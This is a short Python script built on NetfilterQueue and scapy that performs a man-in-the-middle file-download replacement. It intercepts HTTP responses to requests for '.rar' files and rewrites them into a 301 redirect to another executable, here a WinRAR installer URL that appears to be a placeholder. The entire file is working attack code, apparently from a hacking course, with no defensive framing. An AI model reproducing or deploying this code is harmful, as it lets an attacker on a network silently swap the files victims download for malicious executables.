#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            request = str(scapy_packet[scapy.Raw].load)
            # print(scapy_packet.show())
            # print(request)
            if ".rar" in request:
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            # print(scapy_packet.show())
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print(scapy_packet.show())
                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar600.exe\n\n'
                print(scapy_packet.show())
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
                # print(scapy_packet.show())


        # print(scapy_packet.show())
    packet.accept()
    # packet.drop()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
